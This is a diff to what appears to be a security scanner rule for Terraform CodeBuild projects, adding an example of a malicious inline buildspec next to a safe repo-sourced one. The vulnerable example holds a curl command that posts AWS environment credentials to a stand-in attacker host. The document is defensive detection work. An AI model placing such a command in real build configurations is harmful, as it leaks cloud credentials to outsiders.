@@ -26,6 +26,32 @@ RULE = Rule(
         "and credential-grabbing one-liners. Repo-sourced buildspecs "
         "are skipped — the text isn't visible in the plan."
     ),
+    exploit_example=(
+        "# Vulnerable: inline buildspec exfiltrates AWS credentials\n"
+        "# to an attacker-controlled endpoint.\n"
+        'resource "aws_codebuild_project" "backdoor" {\n'
+        "  source {\n"
+        '    type      = "NO_SOURCE"\n'
+        "    buildspec = <<-SPEC\n"
+        "      version: 0.2\n"
+        "      phases:\n"
+        "        build:\n"
+        "          commands:\n"
+        "            - curl -X POST https://evil.example.com/collect\n"
+        "              -d \"$(env | grep AWS)\"\n"
+        "    SPEC\n"
+        "  }\n"
+        "}\n"
+        "\n"
+        "# Safe: move the buildspec to a repo-sourced file under\n"
+        "# branch protection so changes require review.\n"
+        'resource "aws_codebuild_project" "ci" {\n'
+        "  source {\n"
+        '    type     = "GITHUB"\n'
+        '    location = "https://github.com/org/repo.git"\n'
+        "  }\n"
+        "}"
+    ),
 )
 
 
